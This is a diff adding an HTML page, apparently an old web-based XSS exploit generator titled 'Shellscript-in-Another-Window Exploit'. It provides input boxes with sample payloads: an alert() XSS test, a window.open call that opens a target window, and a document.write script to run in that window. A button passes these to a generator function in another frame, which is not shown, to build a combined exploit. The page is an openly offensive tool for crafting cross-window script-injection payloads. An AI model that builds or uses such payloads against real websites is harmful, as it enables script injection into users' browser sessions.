@@ -1,0 +1,35 @@
+
+<body background="bg.jpg" tracingsrc="bg.jpg" tracingopacity="100">
+<A><I><font color="#00FFFF">Shellscript-in-Another-Window Exploit</font></I></A> 
+<BR>
+<BR>
+<INPUT TYPE=BUTTON VALUE="Clear" ONCLICK="Sxe_TEXTAREA.value='';OpenDestW_TEXTAREA.value='';Saw_TEXTAREA.value='';Sawe_TEXTAREA.value='';">		<BR>
+<A><B><I><font color="#00FFFF">Input 1/3</font></I></B></A> <font color="#00FFFF"><BR>
+<A>Simple Xss exploit that pops up an "alert" messagebox with text: <BR>
+<B>genxea(genxem,genxem)genxea</B></A> </font><BR>
+<TEXTAREA ID=Sxe_TEXTAREA STYLE="width:300;height:100" WRAP=OFF>alert("genxea(genxem,genxem)genxea")</TEXTAREA>		<BR>
+<A><B><I><font color="#00FFFF">Input 2/3</font></I></B></A> <font color="#00FFFF"><BR>
+<A>Script that opens Target Window - should initialize "DestW" window where <B>Input 
+3/3</B> will be executed.</a></font><A><A><font color="#00FFFF"><BR>
+</font><A><font color="#00FFFF"><B>(</B></font><a><a><font color="#00FFFF">note:</font></a></a><font color="#00FFFF"><B>Input 
+3/3</B> will be executed after "DestW" is intialized.)</font></A><BR>
+<TEXTAREA ID=OpenDestW_TEXTAREA STYLE="width:300;height:100" WRAP=OFF>DestW=window.open("/","_blank")</TEXTAREA>
+<BR>
+<A><B><I><font color="#00FFFF">Input 3/3</font></I></B></A> <font color="#00FFFF"><BR>
+</font><A><font color="#00FFFF">Script for Another Window( opened by script in 
+<B>Input 2/3</B>)</font><A><BR>
+<a><a><a> 
+<textarea id=Saw_TEXTAREA style="width:300;height:100" wrap=OFF name="textarea">document.write(location.href);document.close();</textarea>
+</a></a></a><BR>
+<INPUT TYPE=BUTTON VALUE="Generated Desired Exploit" ONCLICK="Sawe_TEXTAREA.value=top.frames[0].SxeToSawe(Sxe_TEXTAREA.value,OpenDestW_TEXTAREA.value,Saw_TEXTAREA.value);alert('Mission Completed.');">
+<BR>
+<TEXTAREA ID=Sawe_TEXTAREA STYLE="width:300;height:100" WRAP=OFF></TEXTAREA>
+<BR>
+<SCRIPT>
+//FOR MOZILLA&NETSCAPE
+window.Sxe_TEXTAREA=window.document.getElementById("Sxe_TEXTAREA");
+window.OpenDestW_TEXTAREA=window.document.getElementById("OpenDestW_TEXTAREA");
+window.Saw_TEXTAREA =window.document.getElementById("Saw_TEXTAREA");
+window.Sawe_TEXTAREA =window.document.getElementById("Sawe_TEXTAREA");
+</SCRIPT>
+</a></a></a></a>
